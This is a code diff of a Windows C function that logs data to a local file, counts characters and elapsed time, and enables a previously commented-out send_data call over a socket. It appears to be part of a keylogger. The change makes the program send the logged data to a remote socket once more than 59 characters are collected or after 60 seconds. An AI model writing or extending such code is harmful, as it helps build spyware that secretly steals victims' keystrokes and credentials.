@@ -167,22 +167,25 @@ void	save_data(const char *data)
 	time_t timet2 = 0;
 
 	Sleep(3000);
-	time(&timet2); 
+	time(&timet2);
 
 	double elapseTime = 0;
 
 	if (timet1 != 0)
-	elapseTime = difftime(timet2, timet1);
+		elapseTime = difftime(timet2, timet1);
 
 	FILE *file;
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
 		_wperror(L" Open file failed ");
 	_write(_fileno(file), data, (unsigned int)strlen(data));
-	if (nbChar == 61)
+
+	countTime = countTime + elapseTime;
+
+	if ((nbChar > 59) || (countTime > 60))
 	{
 		if (vfprintf_s(file, "\n", NULL) < 0)
 			_wperror(L" Add \\n at the end of the file failed ");
-	//	send_data(my_sock);
+		send_data(my_sock);
 		nbChar = 0;
 		countTime = 0;
 	}
